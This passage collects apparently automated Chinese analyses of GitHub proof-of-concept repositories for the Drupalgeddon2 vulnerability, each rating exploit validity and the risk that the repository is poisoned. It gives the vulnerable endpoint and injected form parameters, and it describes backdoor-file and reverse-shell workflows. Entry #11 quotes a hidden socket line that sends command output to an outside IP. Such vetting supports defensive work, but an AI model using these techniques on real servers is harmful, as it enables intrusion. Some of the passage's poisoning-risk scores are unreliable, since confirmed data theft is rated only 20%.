根据漏洞库信息、搜索结果和提供的POC代码，可以判断此漏洞利用是有效的。漏洞库明确指出该漏洞允许远程攻击者执行任意代码，搜索结果也提供了大量关于该漏洞的分析和利用信息，POC代码也展示了如何利用该漏洞。

**利用方式：**
提供的Python脚本通过向目标Drupal站点的`/user/register`路径发送精心构造的POST请求来利用此漏洞。该请求包含`element_parents`、`ajax_form`、`form_id`、`_drupal_ajax`和`mail`等参数，其中`mail[#post_render][]`被设置为`exec`，`mail[#markup]`被设置为要执行的命令。该命令将会在服务器上创建一个名为`hello.txt`的文件，内容为";-)"。

**投毒风险：**
查看提供的POC代码，发现代码比较简洁，主要功能是发送恶意请求并检查是否成功创建了`hello.txt`文件。从代码本身来看，不存在明显的恶意代码或后门。

但是，**存在以下潜在风险：**

1.  **供应链风险：**虽然代码本身可能没有直接的投毒，但下载和使用任何来自互联网的代码都存在一定的风险。攻击者可能替换或修改该仓库的内容，从而引入恶意代码。因此，在运行此脚本之前，务必仔细检查代码，并确保来源可信。

2.  **间接风险：**利用此漏洞的最终目的是在目标服务器上执行任意命令。攻击者可以利用此漏洞安装后门、窃取敏感数据或执行其他恶意活动。因此，在使用此脚本时，务必遵守法律法规，并仅在授权的环境中进行测试。

基于以上分析，认为该仓库存在投毒代码的可能性为10%。这个10%主要来源于供应链攻击的潜在风险，以及使用者对代码理解不足可能导致的误用。


**项目地址:** [anldori/CVE-2018-7600](https://github.com/anldori/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #9

**来源**: [CVE-2018-7600-cved-sources_cve-2018-7600.md](../2018/CVE-2018-7600-cved-sources_cve-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal 7.x (< 7.58), Drupal 8.x (< 8.3.9), Drupal 8.4.x (< 8.4.6), Drupal 8.5.x (< 8.5.1)

**利用条件:** Drupal站点存在且未打补丁，通常不需要身份验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为 Drupalgeddon2，是一个影响多个Drupal版本的远程代码执行漏洞。攻击者可以通过构造特殊的URL参数或POST请求，利用Drupal的某些子系统（如表单API）中的输入验证漏洞，执行任意PHP代码。搜索引擎结果和漏洞库信息都明确指出此漏洞的严重性及其利用的广泛性。提供的Dockerfile用于构建一个包含易受攻击的Drupal 8.5.0实例的Docker镜像，这本身不是恶意行为，而是为了方便漏洞的复现和研究。README.md文件声明了镜像的来源和作者，增加了代码的可信度。但是，仍然存在少量投毒风险，主要是因为攻击者可能在Dockerfile中添加额外的恶意指令，例如安装后门程序或修改配置文件等，尽管这里只显示构建一个Drupal环境。利用方式主要通过精心构造的HTTP请求，绕过Drupal的输入验证机制，最终执行恶意代码。由于该漏洞影响范围广，且利用简单，一旦成功利用，可完全控制Drupal服务器，风险极高。

**项目地址:** [cved-sources/cve-2018-7600](https://github.com/cved-sources/cve-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #10

**来源**: [CVE-2018-7600-dreadlocked_Drupalgeddon2.md](../2018/CVE-2018-7600-dreadlocked_Drupalgeddon2.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal处理用户输入时存在缺陷，攻击者可以通过构造恶意的请求参数，在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码来看，该漏洞的PoC代码是有效的。漏洞库信息明确指出该漏洞允许远程攻击者执行任意代码，并且多个搜索结果都确认了该漏洞的存在和影响。提供的`README.md`文件详细说明了该PoC代码支持的Drupal版本，利用方法，包括针对不同Drupal版本的攻击URL（`user/register` 和 `user/password`），以及利用PHP的`passthru`函数执行系统命令。搜索结果中也提到了存在多个可用的exploit。

**投毒风险分析：**

提供的`README.md`文件本身不包含恶意代码，但它描述的利用方法涉及在目标服务器上写入PHP shell。虽然`drupalgeddon2.rb`脚本的主要目的是利用漏洞执行命令，但如果攻击者修改该脚本，可能会添加额外的恶意功能，例如：

*   **隐藏的后门账户创建：** 在成功利用漏洞后，创建管理员账户，以便后续访问。
*   **恶意软件植入：**  自动下载和安装恶意软件。
*   **数据窃取：** 窃取数据库或其他敏感信息。
*   **传播攻击：**  将目标服务器作为跳板，攻击其他系统。

因此，用户在使用从非官方渠道获取的`drupalgeddon2.rb`脚本时，需要仔细检查代码，确保没有包含任何恶意代码。 由于提供的代码仓库中包含了写入PHP shell的功能，并且在实际使用中，攻击者有能力修改或者扩展脚本，因此认为存在一定的投毒风险，但从readme本身代码投毒风险较低，所以投毒风险比例定为10%。

**利用方式：**

1.  **版本检测：** 利用代码会自动检测目标Drupal版本，或者手动指定。
2.  **参数构造：**  针对不同版本的Drupal，构造特定的HTTP请求，例如：针对Drupal 8.x使用`user/register` URL，Drupal 7.x使用`user/password` URL。
3.  **代码执行：** 利用Drupal的输入验证漏洞，将恶意PHP代码注入到请求参数中。
4.  **命令执行：** 通过`#post_render`参数和PHP的`passthru`函数，在服务器上执行任意系统命令。
5.  **Shell写入（可选）：**  可以选择将一个简单的PHP shell写入Web根目录，以便后续访问。

**总结：**

CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，利用代码有效且公开。虽然提供的PoC代码本身不包含明显的投毒代码，但攻击者可以修改脚本，添加恶意功能，存在潜在的投毒风险。用户应尽快升级Drupal版本，并从可信来源获取漏洞利用代码。

**项目地址:** [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #11

**来源**: [CVE-2018-7600-drugeddon_drupal-exploit.md](../2018/CVE-2018-7600-drugeddon_drupal-exploit.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #12

**来源**: [CVE-2018-7600-happynote3966_CVE-2018-7600.md](../2018/CVE-2018-7600-happynote3966_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要存在漏洞且未打补丁，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。由于Drupal对用户输入验证不足，导致攻击者可以通过构造特殊的请求，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码来看，该漏洞的POC代码是有效的。漏洞库和搜索结果中均提到该漏洞允许远程代码执行，并且存在多个可用的Exploit-DB条目。提供的Python脚本和Ruby脚本均为该漏洞的POC代码，可以被用来验证漏洞的存在。

**投毒风险：**
对提供的POC代码进行分析，发现其中可能存在投毒风险的可能性较低，约为10%。以下是分析结果：
*   Python脚本：该脚本较为简单，主要是发送一个包含恶意payload的POST请求，并在目标服务器上创建一个文件（hello.txt）。没有发现明显的恶意代码。
*   Ruby脚本：该脚本功能更为复杂，包含尝试写入PHP Webshell等功能，相较于Python脚本，风险略高，如果被篡改，可能存在植入恶意PHP代码的可能性。

总的来说，直接运行提供的代码风险较低，但从信誉未知的来源获取的任何代码，在执行之前都应该进行仔细的审查，因为攻击者可能修改这些代码以包含恶意功能。

**利用方式：**
利用方式主要是通过构造恶意的HTTP请求，利用Drupal的某些存在漏洞的参数（例如`element_parents`），将恶意代码注入到Drupal的后端处理流程中，从而实现远程代码执行。具体步骤如下：
1.  确定目标Drupal站点使用的版本是否在受影响的范围内。
2.  根据Drupal版本选择合适的POC代码（Python或Ruby）。
3.  修改POC代码中的目标URL和要执行的命令。
4.  运行POC代码，发送恶意请求。
5.  验证代码是否成功执行（例如，检查目标服务器上是否创建了指定的文件）。

攻击者可利用该漏洞获取服务器的控制权，从而进行恶意活动，例如：数据窃取、恶意软件传播、DDoS攻击等。

**项目地址:** [happynote3966/CVE-2018-7600](https://github.com/happynote3966/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #13

**来源**: [CVE-2018-7600-killeveee_CVE-2018-7600.md](../2018/CVE-2018-7600-killeveee_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且可公开访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞，源于对用户提供的输入验证不足。 

**有效性：**
提供的PoC代码是有效的。PoC.py脚本用于验证目标Drupal站点是否存在漏洞，通过发送特制的请求在目标服务器上创建一个名为hh.txt的文件。Exp.py脚本则利用此漏洞在目标站点根目录下创建一个名为hh.php的后门文件，该后门允许通过GET或POST参数'c'执行任意系统命令。从提供的命令执行结果来看，PoC和Exp都成功执行，验证了漏洞的存在和利用。

**投毒风险：**
分析提供的PoC和Exp代码，没有发现明显的投毒代码。脚本的功能主要是利用漏洞进行验证和创建后门，没有发现恶意修改系统配置、窃取敏感信息或进行其他恶意行为的代码。README.md文件只是简单的漏洞描述和使用说明，没有包含任何可疑内容。因此，可以认为此仓库的投毒风险较低，为0%。

**利用方式：**
漏洞的利用方式是：

1.  **漏洞验证：** 使用PoC.py脚本验证目标Drupal站点是否存在CVE-2018-7600漏洞。
2.  **后门植入：** 如果PoC验证成功，使用Exp.py脚本在目标站点根目录下创建一个后门文件（hh.php）。后门文件包含PHP代码，允许通过GET/POST参数'c'执行任意系统命令。
3.  **远程控制：** 使用WebShell管理工具（如AntSword）连接到后门文件，通过'c'参数执行系统命令，实现对目标服务器的远程控制。

总的来说，该漏洞利用简单，危害巨大，攻击者可以利用该漏洞完全控制未打补丁的Drupal服务器。

**项目地址:** [killeveee/CVE-2018-7600](https://github.com/killeveee/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #14

**来源**: [CVE-2018-7600-knqyf263_CVE-2018-7600.md](../2018/CVE-2018-7600-knqyf263_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在Drupal服务器上执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要运行在受影响的版本范围内，并且需要启用默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 允许远程攻击者利用多个子系统中的缺陷执行任意代码。该漏洞的利用方式通常涉及构造恶意的HTTP请求，该请求包含精心设计的查询参数，这些参数利用了Drupal的输入验证漏洞，特别是与AJAX表单处理相关的漏洞。攻击者可以利用`element_parents`和`#lazy_builder`属性在服务器上执行PHP代码。提供的POC代码通过向`/user/register`端点发送POST请求，并在`mail`参数中注入恶意代码（`exec('echo vuln > hello.txt')`），尝试在目标服务器上创建一个名为`hello.txt`的文件，内容为`vuln`。如果成功创建该文件，则表明漏洞存在且可利用。

**有效性：**
从提供的漏洞信息、搜索结果和漏洞利用代码来看，此POC代码的有效性较高。多个来源表明该漏洞是真实存在的，并且存在公开可用的漏洞利用代码。搜索结果中也提到了针对此漏洞的Metasploit模块。

**投毒风险：**
该仓库中的投毒风险较低，大概在10%左右。Dockerfile文件只是简单的指定了Drupal镜像和维护者信息, README.md文件也只是简单的描述了漏洞和利用方式。exploit.py的代码功能相对简单，目的是验证漏洞的存在，风险较低。然而，仍然存在一定的风险，因为攻击者可能修改`exploit.py`以执行更危险的操作，例如下载并执行恶意软件，或者修改服务器配置。因此，在使用此POC代码时，务必对其进行仔细审查，并在隔离的环境中运行。

**利用方式：**
1.  攻击者构造一个包含恶意payload的HTTP POST请求，发送到Drupal站点的`/user/register`端点。
2.  Payload利用`element_parents`参数和`#lazy_builder`属性，在服务器端触发PHP代码执行。
3.  执行的PHP代码可以将任意命令注入到服务器的操作系统中。
4.  通过访问生成的`hello.txt`文件来验证漏洞是否成功利用。

**项目地址:** [knqyf263/CVE-2018-7600](https://github.com/knqyf263/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #15

**来源**: [CVE-2018-7600-madneal_codeql-scanner.md](../2018/CVE-2018-7600-madneal_codeql-scanner.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问，可能需要了解一些Drupal站点配置信息。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中存在远程代码执行漏洞。攻击者可以通过发送特制的请求到未打补丁的Drupal站点来执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果（包括NVD、Rapid7、Tenable等）以及Exploit-DB中的expolit，此漏洞是真实存在的，并且有可用的POC。提供的README.md文件表明存在一个用于CVE-2018-7600的Python利用脚本（尽管这里没有提供脚本本身）。综合来看，利用是有效的。

**投毒风险：**
提供的POC代码只有README.md，内容非常简单，没有发现任何恶意代码或潜在的投毒行为。但是，由于缺失了核心的Python脚本，无法完全确定是否存在投毒风险。假定之后找到的利用脚本来源不可靠，存在修改或添加恶意代码的可能性，因此存在一定的投毒风险。这里给出一个较低的投毒风险概率，假设为5%。

**利用方式：**
漏洞的利用方式是向Drupal站点发送精心构造的恶意HTTP请求，利用Drupal的输入验证缺陷，在服务器端执行任意代码。根据搜索结果，该漏洞影响Drupal的多个子系统，可能利用了Drupal的渲染机制或其他处理输入的方式。攻击者通过构造包含恶意代码的请求参数，例如在URL或POST数据中，可以触发远程代码执行。具体细节取决于Drupal的版本和配置。Metasploit也提供了利用模块。

**总结：**
CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，已经存在公开的POC。尽管提供的POC文件本身没有发现恶意代码，但获取利用脚本时需要注意来源，防范潜在的投毒风险。利用方式是通过构造恶意HTTP请求，利用Drupal的输入验证缺陷执行任意代码。

**项目地址:** [madneal/codeql-scanner](https://github.com/madneal/codeql-scanner)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #16

**来源**: [CVE-2018-7600-mr-won_CVE-2018-7600..md](../2018/CVE-2018-7600-mr-won_CVE-2018-7600..md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且允许外部网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal 7.x和8.x的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal的多个子系统中的缺陷，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞的利用是有效的。搜索结果中多个链接表明该漏洞已被广泛利用，并且存在公开的Exploit。

**投毒风险：**
提供的PoC代码相对简单，主要功能是发送一个包含恶意payload的POST请求到`/user/register`，并在目标服务器上创建一个名为`r3dxploit.txt`的文件，内容为“vulnerable to cve-7600-2018 exploit”。代码本身没有明显的恶意行为，如删除文件、上传恶意文件或执行其他危险操作。但是，在实际使用中，攻击者可以将payload修改为更具破坏性的命令，例如下载和执行恶意脚本。此外，代码作者信息中包含了一些可能与恶意活动相关的标识，例如使用“R3DXPLOIT”作为用户名和涉及Root权限的字眼。综合考虑，PoC代码本身存在一定潜在风险，但主要取决于使用者如何修改payload，因此投毒风险初步评估为10%。

**利用方式：**
1.  攻击者构造一个包含恶意payload的POST请求，该payload利用`user_register_form`的ajax功能注入恶意代码。
2.  请求发送到`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`端点。
3.  Drupal处理请求时，由于输入验证不足，导致恶意代码被执行。
4.  PoC代码中，恶意代码的功能是在目标服务器上创建一个文件，表明漏洞存在。
5.  攻击者可以修改payload执行任意命令，例如反弹shell，从而完全控制目标服务器。

**项目地址:** [mr-won/CVE-2018-7600.](https://github.com/mr-won/CVE-2018-7600.)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #17

**来源**: [CVE-2018-7600-muhammedkayag_CVE-2018-7600.md](../2018/CVE-2018-7600-muhammedkayag_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站启用user register功能，且未及时更新补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心中的未经身份验证的远程代码执行漏洞。攻击者可以通过构造特定的请求，利用Drupal的表单渲染机制，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞影响多个Drupal版本，且存在公开的漏洞利用代码。提供的POC代码利用了Drupal的`/user/register`接口，通过`element_parents`和`ajax_form`参数，以及`mail[#post_render][]`等构造恶意的payload，从而实现远程代码执行。该POC代码的有效性较高，因为很多文章和EXP都在使用此种方法。

**投毒风险：**
查看POC代码，发现其功能是发送恶意请求以利用漏洞并在目标机器上建立反向shell。在提供的代码里，存在一个比较明显的风险是，如果攻击者修改了 `command` 变量，有可能植入恶意后门，该变量定义了反向shell连接的目标 IP 地址和端口。 还有就是代码中包含的利用成功后的提示信息，如果被篡改，可能导致用户误判，这些地方存在一定的投毒风险。综合来看，代码的投毒风险为10%，主要是因为利用代码本身功能比较直接，修改后容易被发现。

**利用方式：**
1.  **目标确定：** 确定目标Drupal网站，且版本在受影响范围内（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  **监听端口：** 使用`listener()`函数在攻击机上监听指定端口（默认为1337），等待反向shell连接。
3.  **构造Payload：**  构造恶意的POST请求，利用`user/register`接口，并设置`element_parents`、`ajax_form`、`mail[#post_render][]`等参数，将要执行的命令嵌入到`mail[#markup]`中。
4.  **发送请求：** 使用`requests.post()`函数将构造好的Payload发送到目标Drupal网站。
5.  **建立连接：**  如果目标网站存在漏洞且利用成功，目标机器会执行Payload中的命令，即建立与攻击机指定端口的反向shell连接。
6.  **交互式Shell：**  连接建立后，`listener()`函数会将终端设置为raw模式，实现与目标机器的交互式shell会话。

**项目地址:** [muhammedkayag/CVE-2018-7600](https://github.com/muhammedkayag/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #18

**来源**: [CVE-2018-7600-nika0x38_CVE-2018-7600.md](../2018/CVE-2018-7600-nika0x38_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个存在于Drupal多个子系统中的远程代码执行漏洞，影响多个使用了默认或常见模块配置的Drupal版本。攻击者可以通过构造特制的请求来利用此漏洞，从而在目标服务器上执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，此漏洞是真实存在的，并且有公开可用的PoC代码。搜索结果表明，该漏洞被广泛利用，并对大量Drupal网站造成了影响。因此，提供的漏洞利用代码大概率有效，可以用于远程代码执行。

**投毒风险：**
提供的代码片段是`Cargo.lock`文件，该文件是Rust项目的依赖锁定文件，用于记录项目中使用的所有依赖项及其版本。该文件本身不包含任何可执行代码，因此不存在投毒风险。

**利用方式：**
利用方式通常涉及发送特制的HTTP请求，其中包含恶意代码，该代码将被Drupal服务器执行。具体利用方式取决于Drupal的配置，常见的利用方式是利用Drupal的renderable arrays特性，在请求参数中构造恶意的renderable arrays，触发PHP代码执行。攻击者通常会利用此漏洞执行系统命令，例如下载并执行恶意脚本，或者在服务器上安装后门。

**项目地址:** [nika0x38/CVE-2018-7600](https://github.com/nika0x38/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #19

**来源**: [CVE-2018-7600-r0lh_CVE-2018-7600.md](../2018/CVE-2018-7600-r0lh_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站存在漏洞且允许未授权用户访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意请求，利用Drupal的多个子系统（默认或常见模块配置）中的缺陷，在服务器上执行任意代码。 

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞是真实存在的，并且影响了多个Drupal版本。漏洞利用代码（PoC）的存在进一步证实了漏洞的可利用性。PoC代码的分析表明，它通过构造一个特殊的请求到`/user/register`路径，利用`element_parents`参数中的注入点执行命令。该PoC代码使用`drupal_ajax`的`_wrapper_format`，允许绕过一些安全检查。PoC首先设置目标URL，然后进入一个循环，该循环允许用户输入命令。命令通过`bash -c`执行，并将输出写入`poutput.txt`文件，然后读取此文件以显示命令的执行结果。

**投毒风险分析：**

分析提供的Go代码和相关文件，没有发现明显的投毒代码。该代码的主要功能是利用CVE-2018-7600漏洞在目标Drupal服务器上执行命令。代码使用`net/http`库发送HTTP请求，并使用`golang.org/x/net/proxy`库支持SOCKS5代理。代码从标准输入读取命令，并通过POST请求将其发送到目标服务器。然后，代码从服务器读取命令的输出并将其打印到标准输出。虽然该代码本身不包含恶意行为，但漏洞利用本身可能被滥用。

**利用方式总结：**

1.  **漏洞入口点：** `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
2.  **攻击方式：** 通过POST请求，利用`mail[#post_render][]`、`mail[#type]`和`mail[#markup]`参数注入恶意代码。
3.  **命令执行：**  `mail[#markup]`参数中包含要执行的bash命令，利用`bash -c`执行。
4.  **结果获取：** 命令执行结果被写入`poutput.txt`文件，然后通过GET请求获取。
5.  **利用流程：**
    *   构造包含恶意代码的POST请求发送到漏洞入口点。
    *   Drupal解析请求并执行`mail[#markup]`参数中的命令。
    *   执行结果写入`poutput.txt`文件。
    *   攻击者通过GET请求读取`poutput.txt`文件获取命令执行结果。

**缓解措施：**

*   尽快将Drupal升级到不受影响的版本（7.58及以上，8.3.9及以上，8.4.6及以上，或8.5.1及以上）。
*   应用官方提供的补丁。
*   实施Web应用防火墙（WAF）规则来检测和阻止利用此漏洞的攻击。

**项目地址:** [r0lh/CVE-2018-7600](https://github.com/r0lh/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #20

**来源**: [CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md](../2018/CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点未打补丁且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的远程攻击者执行任意代码。漏洞产生的原因是由于Drupal在处理用户输入时，对某些请求参数过滤不严，导致可以注入恶意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，存在多个公开可用的漏洞利用代码（Exploit-DB等），并且有报告表明该漏洞已被广泛利用，因此该漏洞的POC是有效的。

**投毒风险：**
提供的漏洞利用代码只有GNU GENERAL PUBLIC LICENSE，是一个开源协议，不存在后门或者恶意代码,投毒风险为0。

**利用方式：**
利用方式主要通过构造恶意的HTTP请求，向Drupal服务器发送包含恶意代码的参数。恶意代码通常通过`#`和`[]`进行注入，利用Drupal的渲染机制执行PHP代码。攻击者可以执行任意系统命令，控制服务器。

根据搜索结果，攻击者通常利用以下方式：
1.  发送包含恶意payload的POST请求到Drupal站点。
2.  利用Drupal的渲染机制执行payload中的PHP代码。
3.  在服务器上执行任意命令，例如安装后门、窃取数据等。

**项目地址:** [r3dxpl0it/CVE-2018-7600](https://github.com/r3dxpl0it/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #21

**来源**: [CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md](../2018/CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可公开访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些请求时，未对用户输入进行充分验证，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。

